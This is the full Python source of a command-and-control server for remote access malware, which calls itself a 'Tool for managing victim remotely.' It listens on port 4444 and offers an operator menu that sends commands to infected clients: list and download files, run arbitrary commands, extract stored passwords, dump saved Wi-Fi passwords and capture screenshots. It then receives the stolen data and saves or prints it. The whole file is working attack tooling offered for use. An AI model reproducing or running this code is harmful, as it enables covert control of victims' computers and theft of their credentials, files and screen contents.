import socket
import threading
from tqdm import tqdm
from colorama import Fore, init
import time
import os
from datetime import datetime

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444

def show_startup_sequence():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTBLACK_EX + """
██╗   ██╗ ██████╗ ██╗██████╗                         
██║   ██║██╔═══██╗██║██╔══██╗                        
██║   ██║██║   ██║██║██║  ██║                        
╚██╗ ██╔╝██║   ██║██║██║  ██║                        
 ╚████╔╝ ╚██████╔╝██║██████╔╝                        
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝      
""")

    print(Fore.LIGHTGREEN_EX +  "██████╗██╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███████╗")
    print(Fore.LIGHTRED_EX +   "██╔════╝╚██╗ ██╔╝██╔════╝ ████╗  ██║██║   ██║██╔════╝")
    print(Fore.LIGHTCYAN_EX +  "██║       ╚████╔╝██║   ██╗██╔██╗ ██║██║   ██║███████╗")
    print(Fore.LIGHTBLUE_EX +  "██║       ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║╚════██║")
    print(Fore.LIGHTMAGENTA_EX +"╚██████╗  ██║   ╚██████╔╝██║ ╚████║╚██████╔╝███████║")
    print(Fore.LIGHTRED_EX + " ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝")
    print(Fore.GREEN + "=" * 40)
    print(Fore.CYAN + "           Cygnus Server v1.0")
    print(Fore.GREEN + "=" * 40)
    print(Fore.MAGENTA + "Developed by Void Cygnus")
    print(Fore.BLUE + "Tool for managing victim remotely.")
    print(Fore.RED + "Loading... Please wait")
    print(Fore.GREEN + "=" * 40)
    time.sleep(1)

def show_command_menu():
    print(Fore.GREEN + "\n" + "=" * 40)
    print(Fore.YELLOW + "            Command Menu            ")
    print(Fore.GREEN + "=" * 40)
    print(Fore.CYAN + "[01] List Files")
    print(Fore.CYAN + "[02] Download File")
    print(Fore.CYAN + "[03] Execute Command")
    print(Fore.CYAN + "[04] Show Current Directory")
    print(Fore.CYAN + "[05] Change Directory")
    print(Fore.CYAN + "[06] Extract Passwords")
    print(Fore.CYAN + "[07] Get Saved Wi-Fi Passwords")
    print(Fore.CYAN + "[08] Get a Screenshot")  # New option for screenshot
    print(Fore.RED + "[99] Go Back to Main Menu")
    print(Fore.RED + "[00] Exit")
    print(Fore.MAGENTA + "\nFollow Void Cygnus on GitHub for more tools and updates!")
    print(Fore.GREEN + "=" * 40)

def handle_client(client_socket):
    while True:
        try:
            show_command_menu()
            choice = input(Fore.YELLOW + "\nSelect an option: ")

            if choice == "01":
                command = "list_files"
            elif choice == "02":
                file_name = input(Fore.YELLOW + "Enter the filename to download: ")
                command = f"download {file_name}"
            elif choice == "03":
                exec_command = input(Fore.YELLOW + "Enter the command to execute: ")
                command = f"execute {exec_command}"
            elif choice == "04":
                command = "current_dir"
            elif choice == "05":
                path = input(Fore.YELLOW + "Enter the path to change to: ")
                command = f"cd {path}"
            elif choice == "06":
                command = "extract_passwords"
            elif choice == "07":
                command = "get_network_passwords"
            elif choice == "08":
                command = "screenshot"  # New command for taking a screenshot
            elif choice == "99":
                print(Fore.YELLOW + "Returning to main menu...")
                continue
            elif choice == "00":
                command = "exit"
                client_socket.send(command.encode())
                print(Fore.RED + "Exiting...")
                break
            else:
                print(Fore.RED + "Invalid option. Please try again.")
                continue

            print(Fore.CYAN + f"Sending command to client: {command}")
            client_socket.send(command.encode())

            # Handle the 'list_files' command response
            if command.startswith("list_files"):
                print(Fore.YELLOW + "Waiting for file list...")
                files_list = client_socket.recv(4096).decode()
                print(Fore.CYAN + "Received file list:")
                print(files_list)

            elif command.startswith("download"):
                print(Fore.CYAN + f"Starting download of {file_name}...")

                # Step to receive the file size
                size_message = client_socket.recv(4096).decode()
                if size_message.startswith("SIZE "):
                    file_size = int(size_message.split(" ")[1])  # Extract size
                    client_socket.send(b"ACK")  # Acknowledge size
                else:
                    print(Fore.RED + "Error: Invalid size message received.")
                    continue

                # Start receiving the file
                total_received = 0
                with open(file_name, 'wb') as f, tqdm(total=file_size, unit='B', unit_scale=True, desc=file_name) as pbar:
                    while total_received < file_size:
                        file_data = client_socket.recv(4096)
                        if not file_data:
                            break
                        f.write(file_data)
                        total_received += len(file_data)
                        pbar.update(len(file_data))

                print(Fore.GREEN + f"File '{file_name}' downloaded successfully to the current directory.")

            elif command == "screenshot":
                print(Fore.CYAN + "Waiting for screenshot...")
                
                # Receive the screenshot size
                size_message = client_socket.recv(4096).decode()
                if size_message.startswith("SIZE "):
                    screenshot_size = int(size_message.split(" ")[1])  # Extract size
                    client_socket.send(b"ACK")  # Acknowledge size
                
                    # Start receiving the screenshot
                    total_received = 0
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    screenshot_file_name = f"screenshot_{timestamp}.png"
                    
                    with open(screenshot_file_name, 'wb') as f, tqdm(total=screenshot_size, unit='B', unit_scale=True, desc=screenshot_file_name) as pbar:
                        while total_received < screenshot_size:
                            screenshot_data = client_socket.recv(4096)
                            if not screenshot_data:
                                break
                            f.write(screenshot_data)
                            total_received += len(screenshot_data)
                            pbar.update(len(screenshot_data))

                    print(Fore.GREEN + f"Screenshot saved as '{screenshot_file_name}' successfully.")
                else:
                    print(Fore.RED + "Error: Invalid size message received.")

            elif command == "get_network_passwords":
                print(Fore.YELLOW + "Waiting for network passwords...")
                wifi_passwords = client_socket.recv(4096).decode()
                print(Fore.CYAN + "Received Wi-Fi passwords:")
                print(wifi_passwords)

            elif command == "extract_passwords":
                print(Fore.YELLOW + "Waiting for extracted passwords...")
                passwords = client_socket.recv(4096).decode()
                print(Fore.CYAN + "Received passwords:")
                print(passwords)

            elif command == "current_dir":
                print(Fore.YELLOW + "Waiting for current directory...")
                current_dir = client_socket.recv(4096).decode()
                print(Fore.CYAN + f"Current directory: {current_dir}")

            else:
                response = client_socket.recv(4096).decode()
                print(Fore.CYAN + f"Client response: {response}")

        except Exception as e:
            print(Fore.RED + f"Error: {str(e)}")
            break

    client_socket.close()

def main():
    show_startup_sequence()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(Fore.CYAN + f"Listening for incoming connections on port {PORT}...\n")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(Fore.GREEN + f"Connection established with {addr[0]}:{addr[1]}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
    except KeyboardInterrupt:
        print(Fore.RED + "\nServer shutting down...")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
